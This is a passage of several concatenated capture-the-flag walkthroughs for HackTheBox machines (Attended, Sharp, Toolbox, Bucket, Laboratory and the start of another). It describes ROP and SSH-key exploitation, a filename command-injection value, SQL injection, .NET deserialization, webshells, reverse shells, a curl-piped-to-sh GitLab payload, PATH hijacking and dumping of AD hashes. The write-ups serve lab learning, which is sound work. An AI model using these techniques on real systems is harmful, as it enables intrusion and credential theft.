movss is Move Scalar Single-Precision Floating-Point Value. So in this case, it will get an address from rdx, and create a float from the bytes at that address, and move it into xmm0 (one of the floating point registers). So I’ll need to convert whatever value I want to come out of this into a float first before storing it.
cvtss2si is Convert Scalar Single-Precision Floating-Point. This gadget will convert the floating point number that was loaded into xmm0 back to an int and store it in esi, the low four bytes of rsi. I noted above that the high four bytes will be null.
For the gadgets above to work, I need to have a place I can write these strings and then have pointers to them. Luckily for me, after the base64 key is decoded onto the stack (into too short a buffer), the first 0x300 bytes of that are copied into a buffer at a static address that doesn’t move around, 0x6010c0:
rax is the number of bytes written to this point. It checks if that’s greater than 0x300, and if so, sets eax (so rax) to 0x300. Then it copies rax to rcx. The address of the decoded output (rsp) is copied to rsi, and the static buffer is copied to rdi. Then it calls rep movsb, which effectively copies rcx bytes from rsi to rdi.
So as long as I write things I need in the first 0x300 bytes of the payload, I can reliably reference know what address they will end up at in that buffer.
Understanding the buffer, here is how I will lay out the SSH public key to be submitted:
In this image, the green parts will be copied into the buffer with the known memory address, 0x6010c0. The ROP (yellow) can reference those.
This all comes together to make a script that generates a malicious public SSH key (full source).
It starts with imports and defining some constants and gadgets:
Now I’ll start the buffer. First I’ll lay out the three parts of a public SSH RSA key (name, e, and n). I’ll define all but the n, as that will be the body I’ll be working in.
For some reason, I needed to include at least a couple bytes from a legit n to get the  ssh client to accept this key as valid. When I was getting errors, I started by copying the first eight bytes of n, and then once I had a working script, removed bytes one at a time until it stopped working with less than two. I thought maybe the null byte might be necessary to make sure the n isn’t negative, but I can’t explain why I needed 0xcc (there are others that work there and others that don’t). Hit me up on twitter or discord if you can explain this.
Next, I’ll loop over the args and get those strings into the buffer, for each one recording the address that it will be at:
I can calculate the address from that static base address plus the length of the buffer before I add the item.
Now I need the array of pointers to those strings. I’ll loop over the addresses, adding them, and then a null to end the array:
Next I need the addresses of the Python string and the args array, but each packed as a float. I’ll use struct.pack to handle that, recording the address that each sits at.
All the data I need is now in the buffer, so I’ll pad with nulls to reach the return address overwrite:
At this point I’ll start the ROP. The order can vary, but rdi has to be before rsi, and both of those have to be before rdx. rax can be at any point. Of course once I set all four, I’ll jump to the syscall.
Now I’ll fill out the size I set earlier in the header with nulls, and encode the buffer to base64 to insert in to a key:
Now, I’ll output the key three different ways for convenience, writing it to a file, printing it the the screen, and saving it to my clipboard (this allowed me to easily move it to the OpenBSD system for testing, or look at it locally):
During gdb testing, I used a different format of output, writing r a a a [base64], allowing me to just copy that and paste it into gdb to start a new run.
When I run this, the key is printed:
I could edit the buffer into a private key as well, but a public key worked just fine for exploiting attended.
I’ll save the key to a file on Attended:
Now with nc listening, I’ll SSH to the GW with that key and any valid user on the box (root is a safe guess):
At nc:
bash isn’t installed on OpenBSD, but ksh is, so I can use that to get a solid shell:
And get root.txt:
The automation to run the submitted SSH config files on Attended as freshness is a Python script:
Immediately on seeing this, it’s clearly vulnerable to a command injection. This doesn’t buy me anything new beyond what comes with the command execution in the SSH config, but it’s still fun to show.
The script reads the name of each file in the directory, and uses it to generate a string that’s passed to subprocess.Popen in an unsafe way.
To demonstrate, I’ll create an empty file and upload it as /home/shared/k;ping -c 1 10.10.14.14;:
The sleep 60 on the end just helps me know if this returns and still no ICMP, then it didn’t work.
That will create a file with that long name. When Python walks that dir, it will create the string command: /usr/bin/ssh -l freshness -F k;ping -c 1 10.10.14.14; 127.0.0.1. When that string is passed to Popen, It will try to run the ssh and fail because k doesn’t exist. Then it will ping my VM. Then it will error on unknown command 127.0.0.1.
The ICMP packets arrive just under a minute later showing it worked:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 05 Dec 2020
OS : Windows
Base Points : Hard [40]
Nmap scan:
Host is up (0.019s latency).
Not shown: 65529 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  wsman
8888/tcp open  sun-answerbook
8889/tcp open  ddi-tcp-2Category: Recon
nmap found six open TCP ports, RPC (135), NetBios (139), SMB (445), WinRM (5985), and  two unknown services (8888 and 8889):
I don’t get much information about the OS, other than that it’s Windows.
8888 and 8889 don’t show much. Connecting to them with nc to either doesn’t return anything.
net view from Windows won’t show anything as far as shares:
Interested in any comments as to how to find the share using Windows. I’ll do this part from Parrot.
smbmap will list the shares, showing one with anonymous read access:
smbclient will show the share as well:
There’s a handful of files:
Some Googling reveals these are all related to PortableKanban, software for tracking tasks.
Googling for PortableKanban exploit finds this exploitdb post. It’s a Python script that looks at a PortableKanban.pk3 file and prints the plaintext passwords from it.
Grabbing the file from the SMB share, and running the script gives two passwords:
That script was posted on 11 Jan 2021, about a month after this box released, which means it wasn’t there at release. The intended path is to look at PortableKanban and figure out how the configuration decrypts the password.
The PortableKanban.pk3 file is JSON, and contains information about the users in this instance of PK. To look at it, I’ll use cat PortableKanban.pk3 | jq . | less. The Users section show two users, Administrator and lars:
The passwords are encrypted, as expected.
I’ll copy the entire folder of binaries over to a Windows VM and open DNSpy. I’ll select PortableKanban.exe, and then open the search window (Edit –> Search Assemblies or Ctrl+Shift+K). I searched for “password”, making sure to select “All of the Above” for the what and “Files in the Same Folder” for where:
There were a fair number of results, but I was immediately interested in DbEncPassword, DbEncPassword2, DbPassword, and DbPassword2, all from the RoamingSettings class. Clicking on DbEncPassword leads to the code that defines it. DbEncPassword is just a string, but DbPassword is more interesting. The get function returns Crypto.Decrypt on DbEncPassword, and the set takes a value, passes it to Crypto.Encrypt, and then stores the result in DbEncPassword:
Crypto.Decrypt is defined as:
It’s doing a DES decryption using Crypto._rgbKey and Crypto_rgb.IV as the key and IV, which are defined just after this function. With the key and the IV, I can write a Python script that would look very similar to the one above now on exploitdb that will decrypt the value in the config.
IppSec pointed out a near alternative way to get the user passwords from PortableKanban. On the SMB share is a file, pkb.zip, which is a clean instance of the software. I’ll unzip that into a directory. I’ll copy into that directory PortableKanban.pk3. Now I’ll edit it by copying the Administrator JSON and adding a third user, replacing the name Administrator with 0xdf, changing the ID to something different, and setting the encrypted password to “”.
Now I’ll double-click PortableKanban.exe, and it offers the startup question of where I want to store data, in a file or in Redis:
I’ll hit ok with Local file selected. I’m able to log in with 0xdf and an empty password. Clicking on the gear icon and then going to the users tab, if I unckeck “Hide passwords”, I get the Administrator and lars passwords:
Unsurprisingly, the administrator creds do not work for Sharp, but the lars ones do:
lars cannot WinRM:
smbclient will connect as lars:
I can also do this from Windows:
There are four files on this share:
I’ll download all four file - the three binaries are all .NET executables:
The notes.txt has some hints

Category: Shell as lars
I’ll open Server.exe in DNSpy and notice right away it’s much more simple than the previous binary:
The module is RemotingSample, which likely means it was built on top of a sample from somewhere. Main creates a thread and runs StartServer, which is a service listening on TCP 8888:
It’s important to note that the TypeFilterLevel is set to Full. Also, I’ll need the name of the service, SecretSharpDebugApplicationEndpoint.
The client is even simpler:
Main shows a connection to the same endpoint, with credentials:
.NET remoting is an older, insecure API/protocol, which is now superseded by Windows Communication Foundation (WCF). Searching for “.NET remoting exploit” will return a bunch of good resources. Intro to .NET Remoting for Hackers is a really nice walkthrough of how to exploit the system in General. Finding and Exploiting .NET Remoting over HTTP using Deserialisation (by NCC Group) goes into detail on a specific attack, which will work in this case. The ExploitingRemoteService GitHub repo from James Forshaw provides a tool to facilitate that deserialization attack.
To exploit this, I’ll generate a serialized payload to execute commands, and then feed it into ExploitingRemoteService.exe.
This took so much trial and error, and some asking friends to help to get working. I won’t be able to show that, but did want to make clear that this part was hard and required persistence.
I’ll download the repo from Git to my Windows VM, and then double click on the .sln file to open it in Visual Studio. I’ll set the config to Release and leave it on Any CPU, and Build –>  Build Solution. At the Output window, I can see it Builds:
I’ll need the six files from the ExploitRemotingService path:
I’ll move them to a move convenient folder, but I could also run from there. As long as all the files are together.
I can try to use this binary with the exec mode first. I’ll get a cmd window with creds for lars:
In the new window, at the top left it shows that it’s running as lars:
To show that lar’s creds are cached here, I can run net user on the dev share without re-entering the creds:
That wouldn’t work in another window.
It says on the GitHub page to try the ver command:
It crashes with an error in deserializing. I’ll try to run with the exec command, but it doesn’t work:
It’s failing to deserialize the message. I should try a serialized payload.
I’ll use YSoSerial.net to generate a serialized .NET attack payload. I used this a long time ago in HTB Json.
I’ll generate a payload that will ping my machine. The NCC Group blog mentioned the TypeConfuseDelegate gadgets, but others may work as well:
I want the BinaryFormatter to work with the executable above. And the base64 output will be passed in.
As requested, the payload is base64-encoded:
Putting this all together, I’ll start Wireshark and run it:
It returns an error message, but that’s typically for deserialization attacks. More importantly, in Wireshark:
I’ll start a Python3 webserver in a directory with nc64.exe:
I’ll generate a payload to upload nc:
Now running the exploit results in an error:
But also a GET request to the server:
Now one more payload to execute it, and run it:
At a listening nc.exe, there’s a shell:
And I can claim user.txt:

Category: Shell as System
I’ll update the Main function to use the nc64.exe already on Sharp:
After building and running, I get a shell as System:
And I can grab root.txt:
Sharp is offering a WCF service that will take a string and execute it as PowerShell. There’s nothing to stop me from writing a shell just using that. To start, I can edit Main to prompt for a command, and then send that:
Running it, I’ll give it whoami, and the result comes back:
I can wrap that in a while (true) loop:
Now it will continually prompt for commands and run them:
I’ll leave it here, but there are other improvements one could make:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 12 Apr 2021
OS : Windows
Base Points : Easy [20]
Nmap scan:
Host is up (0.033s latency).
Not shown: 64872 closed ports, 649 filtered ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknownCategory: Recon
nmap found many open TCP ports, including FTP (21), SSH (22), RPC (135), Netbios (139),  SMB (445), HTTPS (443), and WinRM (5985):
The OpenSSH banner suggests the OS is Windows 7.
There’s a certificate on 443 with the domain name admin.megalogistic.com.
Anonymous login is allowed on FTP.
Given the existence of admin.megalogistic.com, I’ll fuzz to see if any other virtual hosts display something different, but didn’t find anything besides admin:
As nmap noted, anonymous login is available for FTP. I’ll give it the username anonymous and a blank password:
There’s a single file available, docker-toolbox.exe:
Docker Toolbox is an older solution for running Docker in Windows, before Windows had native Docker support. It basically ran a VirtualBox Linux VM that runs Docker and its containers.
I don’t need a copy of the exe at this point, but fair to assume this is a hint for later.
Anonymous access is not permitted to SMB:
The site is for a shipping / logistics company:
Most of the site is just lorem ipsum text (filler), and the forms don’t seem to submit anywhere. I could make a list of potential usernames from about.html, but it’s just names without emails, so I’ll look elsewhere first.
All the pages look static at this point.
This page presents a login form:
The “Forgot Password?” link doesn’t lead anywhere. A guess of admin/admin returns a message that “Login failed”.

Category: Shell as postgres in container
If I try to login with password ', the page return the form, with an error message in the background at the top:
The message reads:
Warning:  pg_query(): Query failed: ERROR:  unterminated quoted string at or near “’’’);” LINE 1: …FROM users WHERE username = ‘admin’ AND password = md5(‘’’);                                                                  ^ in /var/www/admin/index.php on line 10
Warning:  pg_num_rows() expects parameter 1 to be resource, bool given in /var/www/admin/index.php on line 11
There are multiple things to learn from this:
From the error above, I can guess that the SQL query being run looks like:
Then the site likely checks if there are results to determine if access should be allowed.
If I submit the username ' or 1=1-- -, then the query will be:
Because -- - makes anything after a comment, this will return all users, and hopefully let me in.
On submitting:
I’m at the admin dashboard, but it doesn’t do much.
A login form isn’t displaying data from the DB back to the page, so it’s a more difficult blind injection. For an easy-rated box like Toolbox, I’ll turn to sqlmap. I’ll save a POST request for login from Burp to a file with right-click, “Copy to file”. It’s important that this request not have any injections in it, or sqlmap will yell.
I’ll run with -r login.request to give it the file to work from, --force-ssl (as that’s where the site is), and --batch to accept the defaults at the prompts. It finds four injections:
I’ll add --dbs to the end of the command and run it again to list the dbs:
sqlmap -r login.request --force-ssl --batch -D public --tables will list the tables in public, finding one:
sqlmap -r login.request --force-ssl --batch -D public -T users --dump will dump a single user, admin, and their password hash. sqlmap tries to crack it but fails, and Google doesn’t know it either.
The other two tables aren’t interesting.
One technique that rarely works, but is always worth trying is the --os-cmd flag in sqlmap. From the docs, for PostgreSQL, it will upload a shared library to the system that will work with the database and run arbitrary commands on the system.
I’ll try whoami since it will work on either Linux or Windows, and it works:
The previous command identified the OS as Debian 10. Given this is a Windows host according to HTB, this must be in a Docker container. The id command returns as well:
The --os-shell flag will drop into an interactive prompt to run more than one command as well:
I’ll start nc and give sqlmap a Bash reverse shell to see if it works:
It hangs here, but at nc there’s a shell:
Legacy Python is not installed, but Python3 is:
I’ll upgrade my shell using the standard trick:
This is important as I can’t do the next steps without a full TTY.
There’s also a user.txt in postgres’ home directory (not sure why it says flag.txt in the file, but the hash works):

Category: Shell as docker/root in VM
I’m definitely not on the host machine now. ifconfig shows the IP 172.17.0.2:
The file system is quite empty.
At this point, a bit more detail about Docker-Toolbox is necessary. The solution is deprecated, but that doesn’t mean it can’t be seen in the wild. Docker Toolbox installs VirtualBox, and creates a VM running the boot2docker Linux distribution. From it’s README:
Boot2Docker is a lightweight Linux distribution made specifically to run Docker containers. It runs completely from RAM, is a ~45MB download and boots quickly.
At the bottom of that page, there’s information on how to SSH into the VM using the username docker and the password tcuser. I considered doing a ping sweep of the network to look for other hosts, but ping isn’t installed on this container.
I can guess that since this container is .2, the host (VM) is likely .1, and try to ssh into it. It works:
This user has full sudo with no password:
I’ll take a root shell:

Category: Shell as root
There’s nothing interesting in any of the homedirs on this VM. This is, as I suspected, boot2docker:
There’s an interesting folder at the system root, c:
It looks like it has mounted the Users directory, which is standard in a Windows system:
In the Administrator’s folder, in addition to a bunch of typical Windows stuff, there’s a .ssh directory:
While this is typically thought of as a Linux thing, Windows with SSH can have this as well to allow for key-based auth and other standard SSH needs. There is a key inside:
The public key here is in authorized_keys, as this returns nothing:
ssh-keygen -y -e -f keyfile will return the public key for the key, so I can use that to check if the private key here matches the public (and the one in authorized_key):
They match!
I’ll create a copy of the private key on my local VM, and set the permissions so that SSH will trust it:
Now I can use it to auth as administrator:
And get the final flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 17 Oct 2020
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.019s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (80):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu Focal 20.04.
The webserver on TCP 80 is returning a redirect to http://bucket.htb. I’ll want to fuzz for virtual hosts.
Visiting http://10.10.10.212 returns an HTTP 302 redirect to http://bucket.htb. After updating /etc/hosts, the page loads a site for the Bucket Advertising Platform:
Looking at the page source, the images are loaded from s3.bucket.htb, for example:
After updating my hosts file again, now the images load:
There’s not much else here. The response headers don’t reveal much. index.php doesn’t exist, but rather the main page is index.html. There’s an email address, support@bucket.htb.
I ran gobuster, but didn’t find anything.
Given the use of different virtual hosts (vhosts), I used wfuzz to look for others:
The two starting with # likely error out due to the #, and I already knew about s3.
I noticed above that the s3.bucket.htb domain returned a 404 status code in the fuzz above. In the browser, it just shows JSON about the status:
In Burp, the full response is:
Googling for any of these headers with amz in them will return a bunch of Amazon AWS docs. Given the name of the machine, the subdomain name, and now these headers, it’s pretty clear this machine will have some focus on simulating Amazon Cloud services.
Given that the images are hosted in this instance of S3, it seems likely that the site pages are as well. I can test this by trying to get index.html:
That matches the page.
There’s a handful of AWS terms that are useful to understand here:
I’ve already seen urls that fit the typical S3 format hosting the images on the webpage:
It’s common to see these urls as http://s3.[host]/[bucket name]/[file].
Interacting with a S3 bucket can be done over curl, but as the interactions get more complicated, it’s easier to use aws command line interface (apt install awscli). aws help will load a manual page for the client, including listing a large number of subcommands like s3 which I’ll use heavily for Bucket. The --endpoint-url option will be important as I want to go to Bucket from HTB instead of to AWS S3.

Category: Shell as www-data
Depending on the permissions assigned to the bucket, I may or may not have to authenticate to upload to it.  aws s3 help provides another manual page, and at the very bottom is a list of subcommands. ls is interesting, but it fails:
The typical case for S3 is that credentials are required to administer a bucket. Still, if the bucket is misconfigured (or configured to allow anonymous access), then those creds won’t be validated, so I’ll try adding some. It works:
There’s a single bucket on this server that I can access with those bogus creds. I can look inside it by providing an S3URI of the format aws s3 ls s3://mybucket (from aws s3 ls help).
The bucket contains index.html and an images directory with the three images from the page:
Another command was cp. I’ll create a dummy file to upload, and use cp to upload it:
It’s there, but it doesn’t return from the main url:
I wonder if only .html pages are being hosted? I’ll upload the same file with a .html extension, and after a few seconds, the file is available via the main site:
It doesn’t host .txt, but it does host .html. What about .php?
It does. That means it’s likely to execute PHP as well.
I’ll upload a simple webshell:
It takes a minute, but eventually it shows up and executes:
There’s clearly something also clearing out the bucket every minute or two, so if the webshell disappears, I’ll need to re-upload it.
I’ll go deeper into that automation (how the script gets to Bucket) in More Beyond Root.
To go from webshell to shell, I’ll use the Bash reverse shell:
At nc, the connection provides a shell:
I’ll upgrade to a full PTY:

Category: Shell as roy
The shell starts in /var/www/html, where there’s only index.html. I’ll upload the webshell again, and after a short wait, it shows up:
It’s interesting that that file is owned by root. www-data does not have permission to write here.
There’s another folder in /var/www, bucket-app. I don’t have permissions to access this either:
bucket-app is owned by root, but there’s a plus at the end of the permissions string. That means it has extended permissions, or ACLs:
roy has access to this directory to read and execute.
There’s only one directory in /home, for roy. I can’t read user.txt yet, but there’s also a project directory:
It contains four files:
db.php contains connection information to DynamoDB, which is AWS’ NoSQL database instance. The command line client for is happens to be aws, which is installed on Bucket. There’s a good list of subcommands in aws dynamodb help. list-tables seems like a good place to start.
On Bucket, it complains about the config again:
Unfortunately, I can’t save preferences here as www-data:
However, I am able to connect from my host (I’ll dig into why a bit in Beyond Root):
The scan subcommand seems like the one to use to dump an entire table. The users table has three users with passwords:
AWS has this web front end for interacting with DynamoDB using Javascript, and since it seems that requests are passing through to that, it makes sense that that shell is also available at http://s3.bucket.htb/shell/:
I had a hard time getting this to work in Firefox, but it worked in Chromium. Others I talked to didn’t have that issue. There are issues with Edge, so it could be some setting in my Firefix.
The </> button will offer a bunch of templates. I’ll pick the one for “List Tables”. Both the params are optional, so I’ll delete them, leaving:
On running this, results are returned (this is where in Firefox I got CRC32 errors):
Similarly, it can dump the data using scan:
Resulting in:
It’s worth noting that I was able to access these passwords on DynamoDB without any auth, and so if I did manage to leak a username, or was willing to brute force on via a password spray attack, I could skip the webshell upload entirely and go right to the next step as roy.
I’ve got one user, roy, and three passwords. I’ll use jq to dump the passwords to a file:
With that list, I can use crackmapexec to test them one by one:
The last one works!
I can now grab user.txt:

Category: Shell as root
netstat shows a service listening on 8000 only on localhost (as well as 4566, which I’ll explore in Beyond Root):
In /etc/apache2/sites-enabled/000-default.conf it defines both the main site on 80 and the bucket-app site listening on 8000 only on localhost:
AssignUserId root root means that the application on 8000 is also running as root!
I’ll reconnect with an SSH tunnel (-L 8000:localhost:8000). This will start a listener on port 8000 on my VM, and any packets sent to it will be sent through the SSH session and then to localhost port 8000 on Bucket.
The page just says it’s under construction:
roy can access bucket-app:
At the top of index.php, there’s some code:
On a POST request with the action parameter set to “get_alerts”, it will query the DynamoDbClient for alerts that contain “Ransomware” in the title column. For each result, it will create a random filename in files and write the contents of the data column into that file.
Then it calls the pd4ml Jar on that temporary HTML file to convert it to PDF.
To test this, I’ll need to put entries into the database in the table alerts with a title that includes the string “Ransomware” and the data I want to see in the data column.
I already looked at the local Dynamo in a previous step. There was no table alerts. I’ll create one. The command aws dynamodb create-table help and this page provide the syntax:
The table now shows up in the list:
Now I can add an item to the table:
And then trigger the page with a curl:
Back in the shell as roy, two files show up in files based on the data in the table:
I’ll copy the PDF back with scp:
It also has my data:
In reading about  pd4ml, I found this list of examples. One of them caught my eye - Add Attachment. This page has more examples of tags that can be added. I’ll build a payload that looks like:
The database is constantly being cleared (every minute?), so I may need to recreate the table, and then I’ll add this to it:
Now I’ll use curl to trigger it:
And get the PDF with scp:
Double clicking on the paperclip pops a prompt to open the file:
It worked!
It got frustrating to work with when the box was clearing the table every minute, so I wrote a script the handle it:
It’s using a tool pdfdetach from Xpdf (apt install xpdf) to pull the attachments out and then show the results.
One cool thing about these attachments - if I try to attach a directory, it will attach a dir list:
Using the script, I can now enumerate the box as root. In the homedir, there’s the flag:
I can grab it:
There’s also a .ssh directory that contains a key pair, and the public key is in the authorized_keys file:
I’ll grab the private key and get a shell:
I was curious as to why I was able to connect to the DB on localhost:4566 using the aws client from my host. 4566 wasn’t exposed publicly on Bucket, but rather I used the --endpoint-url http://s3.bucket.htb.
The apache config (with comments removed) looks like this:
The first virtual host is routing for the localhost server on port 8000.
The second one is looking at all traffic that doesn’t have a host ending in bucket.htb and returning 302 to http://bucket.htb/. It’s also serving the default /var/www/html.
The third server is for s3.bucket.htb, and it will proxy everything to http://localhost:4566.
What is running on 4566? netstat gives the process as docker-proxy:
Looking at the running containers, it’s a container called localstack:
localstack is a local AWS cloud stack, designed for developers to develop and test cloud / serverless applications offline. It has a routes which listens on 4566, and manages all the requests to the correct service. This is a really neat way to bring the AWS testing experience to HTB!
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 14 Nov 2020
OS : Linux
Base Points : Easy [20]
Nmap scan:
Host is up (0.017s latency).
Not shown: 65532 filtered ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  httpsCategory: Recon
nmap found three open TCP ports, SSH (22), HTTP (80), and HTTPS (443):
Based on the OpenSSH and Apache versions, the host is likely running Ubuntu 20.04 Focal. nmap shows the TLS certificate has the name laboratory.htb, as well as git.labority.htb. The HTTP server shows a redirect to HTTPS laboratory.htb as well.
I did a quick wfuzz to look for other subdomains, but only found git:
I’ll add those two to my /etc/hosts file:
Visiting the site over HTTP by either IP or hostname just return a 302 redirect to the HTTPS site
The site is a page for a company in Infosec services:
The main page is index.html, which doesn’t reveal much about the site. Similarly, the response headers just show Apache. I’m inclined to think there could be some PHP, or that it’s a static site.
I’ll run gobuster against the site, and include -x php since I suspect the site could be PHP:
Nothing there unexpected or interesting.
The site is an instance of GitLab:
I don’t have creds, but I can register. I tried, but at first it returned an error:
Changing the emails to 0xdf@laboratory.htb fixes that.
Under Projects -> Explore projects I find a single project that I can access, “Secure Website”:
It’s the code for the website running on laboratory.htb, and it looks very much like a static site:
The project is not set up to run pipelines, so I’m out of luck there:
The owner of the project is Dexter McPherson, and it looks like his account name is just dexter:
The help page gives the GitLab version:
searchsploit identifies a arbitrary file read vulnerability in GitLab 12.9.0, which is newer than 12.8.1, so it might apply here as well:
I couldn’t get either of the Python scripts there to work, but it was enough to send me Googling, where I learned a good bit more about the vulnerability.

Category: Shell as git
To exploit this vulnerability (CVE-2020-10977), I’ll need to create two projects:
Then go into proj1 and create an issue with markdown language image reference where the image is a directory traversal payload pointing to the file I want:
After submitting that, expand the menu on the right side, and at the bottom of it I’ll find “Move issue”, where I can select proj2:
In the new issue, there’s a file linked at the top just under the issue name:
Clicking on it will download a copy:
In searching for information about this exploit, I found this repo. The script is pretty slick:
Now I’ll enter a filename, and it works:
On exiting, it cleans up as well:
In the script above, there’s a link to a HackerOne report, and while the report starts off as arbitrary read, the researcher finds how to convert that to code execution. I’ll start by reading /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml:
For the exploit to work, my payload will need to be created in an environment with the same secret_key_base.
I need a copy of this version of GitLab to build the deserialization payload. The easiest way to do that is using Docker. I’ll install with sudo apt install docker.io. I’ll need to add myself to the docker group as well (sudo usermod -a -G docker oxdf and log out and back in). Now I can get and run the image with docker run gitlab/gitlab-ce:12.8.1-ce.0. For this image to work properly, it’s better to let it start on it’s own like this (rather than having it run bash to get a shell) so that the various GitLab components can start.
After a minute, once the container has started, in another terminal I’ll run docker ps to get the name of the container, and then docker exec to get a shell in it:
To update the secret_key_base, I’ll add it to /etc/gitlab/gitlab/rb inside the container:
I’ll start the irb console, and note that the secret_key_base variable is updated to match the one from Laboratory:
This is the key that is used to sign serialized objects so that a user can’t tamper with them. Because I have it, I can now generate my own serialized payload and the server will trust it and deserialize it, which is a path to code execution.
I’ll build a payload using the steps from the HackerOne report:
At this point it’s time to set the payload. I’ll use a simple curl to myself piping the results into sh:
Interestingly, the next two steps each run the payload. In this case, as I haven’t started a webserver on my host, it fails to connect all three times:
Now print the payload:
I’ll start a Python webserver, and use curl to send the payload. I need -k to ignore the invalid certificate:
Immediately at the webserver, there’s a request from Laboratory:
I’ll write a simple payload and save it as sh in the hosted directory:
On re-running the same curl command, the hit on the webserver is successful this time:
And there’s a shell at nc:
I’ll upgrade the shell:

Category: Shell as dexter
It becomes clear very quickly that there’s not much here except for GitLab, and I’m in a Docker container:
I can pull the local IP address from /proc/net/fib_trie:
I didn’t find much in the way to escalate to root in this container, so I started looking at GitLab itself. I can’t access the /etc/gitlab/gitlab.rb file where much of the configuration information is stored:
There’s a ton of cheatsheets out there for interacting with GitLab through the Gitlab-Rails console (like this, this, and this). Playing around a bit, I could enumerate the system.
I’ll start the console:
I can list the users, and the admin users:
Since dexter is the only admin, perhaps I could reset his password:
Now I can log in to git.laboratory.htb as dexter, and there’s an additional project:
Alternatively, I could also give myself admin privs for GitLab:
Now logged in as 0xdf, I can access the private project under Projects –> Explore.
The project has a handful of files in it, most of which are not that interesting. There’s a todo.txt:
I’ll note those for later. But more importantly there’s a .ssh folder in dexter and it has a private key in it:
Using the private key, I can get a shell as dexter:
And get user.txt:

Category: Shell as root
Looking at the SUID binaries on the box, one jumped out as something custom to this box:
/usr/local/bin/docker-security is probably what was referenced in the todo.txt from the repo.
One interesting note that’s unrelated to solving the box - the only binary on the box from 2021 is sudo, which was likely patched for CVE-2021-3156).
I could pull this binary back and reverse it in Ghidra, but given this is an easy-rated box, I’ll start with ltrace (which fortunately is installed on this box):
The binary is calling system("chmod ..."). The important part here is that it isn’t using the full path to chmod. That is something I can exploit.
I don’t see any tools to compile a binary on Laboratory, so I’ll work on my VM. I’ll use this snippet of C code:
It simply sets the process privs to root, and then calls bash. I don’t actually need the setresuid call, as docker-security actually calls setuid(0) and setgid(0) before calling chmod. This is just handy template I have around for cases like this, and many times a process will actually lower it’s privileges before making a risky call (and the setresuid fixes that for me).
I’ll compile this and copy it to Laboratory with scp:
I’ll also update the PATH variable so that /tmp is the first directory checked:
When docker-security runs, when it makes the call to chmod, it will get the chmod binary from /tmp, which will return a shell:
And I can grab root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 31 Oct 2020
OS : Windows
Base Points : Insane [50]
Nmap scan:
Host is up (0.065s latency).
Not shown: 65533 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpcCategory: Recon
nmap found two open TCP ports, RPC (135) and HTTP (80):
Not much on the OS beyond Windows.
The site is for a hosting company:
I recognized this website from Endgame Hades, but the vulnerability in that site isn’t present on this one.
There’s a bunch of static content, and a contact support form:
The form tries to submit to 10.13.38.16, which is also a part of Hades:
I’m guessing this is just reused, and also not useful. At the very bottom of the page, there’s a comment:
Definitely mirrored from Hades.
I didn’t find much else useful on the website, and given that it appears to just be copied from Endgame, I suspect I should look elsewhere. I did run Feroxbuster to brute force directories, but didn’t find anything useful.
This box gets into a level of detail that is quite a stretch for me, so I’m going to do my best to explain it, but also might handwave a bit more than usual. It’s easy to confuse the services offered over 135, 139, and 445 on Windows. This Technet Article gives a good, long, and very detailed description of the different services and the different ports they use.
rpcclient will try to connect to TCP 445 or TCP 139, so it doesn’t do much here.
TCP 135 is the Endpoint Mapper and Component Object Model (COM) Service Control Manager. There’s a tool called rpcmap.py from Impacket that will show these mappings. This tool needs a stringbinding argument to enable it’s connection. The examples from -h are:
stringbinding         String binding to connect to MSRPC interface, for example:
                        ncacn_ip_tcp:192.168.0.1[135]                                                  
                        ncacn_np:192.168.0.1[\pipe\spoolss]                                            
                        ncacn_http:192.168.0.1[593]                                                    
                        ncacn_http:[6001,RpcProxy=exchange.contoso.com:443]                            
                        ncacn_http:localhost[3388,RpcProxy=rds.contoso:443]
NCANCN_IP_TCP is an RPC connection directly over TCP. That seems like a good place to start. Running that gives a list of RPC mappings:
This scan provided a bunch of RPC endpoints with their UUIDs. The MS-DCOM ones are defined on this page. The one shown above is the RPC interface UUID for IObjectExporter, or the IOXIDResolver. This is know that is used for the Potato exploits. This article shows how to use this interface to get a list of network interfaces without auth.
There’s a POC script at the bottom (I added () around the print statement so it would work with modern Python), which I’ll grab and run:
With the IPv6 address, I’ll try nmap again, and there’s a bunch more open ports:
That’s a bunch more information. All the open ports make it look like a Windows DC. The OS is Windows Server 2016 Standard 14393.
IPv6 support was added to CrackMapExec in version 5.1.6dev. Still in trying to use it, there is a bug when trying to list shares. I reached out to one of the devs who got it fixed:
If you can’t get the latest version, smbclient also shows the shares:
There’s a share called backup. It contains a single file, backup.zip:

Category: Shell as henry.vinson_adm
backup.zip looks like the backup of an Active Directory environment. The files are the ones needed to restore an AD environment, or to maliciously dump all the hashes offline:
On trying to unzip, it asks for a password:
zip2john will provide a hash for the password of the zip:
That hash matches “PKZIP (Compressed Multi-File)”, or more 17220, on the Hashcat example hashes page. It breaks in hashcat very quickly:
The password “iloveyousomuch” will decompress the archive.
secretsdump.py will take the System hive and the ntds.dit file and dump that hashes. There are a ton of them.
I’ll save it to a file, and grep to get just the hashes, and there are 2000:
I tried taking the admin hash and logging in with crackmapexec and psexc.py, and both returned invalid credentials:
With 2000 users, I need a way to check how much of this is valid. Because Kerberos is available on IPv6 (TCP 88), I can use Kerbrute to check the users. I’ll get a list of just the users:
